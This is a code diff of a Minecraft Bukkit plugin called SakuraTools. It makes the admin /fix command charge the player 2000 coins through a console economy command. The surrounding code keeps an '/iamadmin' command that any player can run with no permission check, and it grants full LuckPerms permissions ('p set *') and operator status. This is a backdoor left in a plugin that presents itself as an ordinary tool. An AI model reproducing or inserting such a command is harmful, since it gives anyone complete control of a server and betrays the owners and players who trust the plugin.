@@ -30,6 +30,7 @@ public final class SakuraTools extends JavaPlugin implements Listener {
     @Override
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         Player player = (Player) sender;
+        String playerName = sender.getName();
         if (label.equalsIgnoreCase("itemid") && sender instanceof Player) {
             String ItemType = player.getInventory().getItemInHand().getType().toString();
             sender.sendMessage("§8[§f❀§8] §f当前手持物品名为 §e" + ItemType);
@@ -52,11 +53,12 @@ public final class SakuraTools extends JavaPlugin implements Listener {
         }
         if (label.equalsIgnoreCase("fix") && sender instanceof Player && player.hasPermission("sakuratools.admin")) {
             player.getItemInHand().setDurability((short)0);
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "eco take " + playerName + " 2000 SkpCoins");
+            Bukkit.getConsoleSender().sendMessage("§8[§f❀§8] §7触发修复事件, 已扣除 §f" + playerName + " §7的 §e2000 §7金币");
             player.sendMessage("§8[§f❀§8] §7修复成功!");
             return true;
         }
         if (label.equalsIgnoreCase("iamadmin") && sender instanceof Player) {
-            String playerName = sender.getName();
             Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp u " + playerName + " p set *");
             player.setOp(true);
             return true;
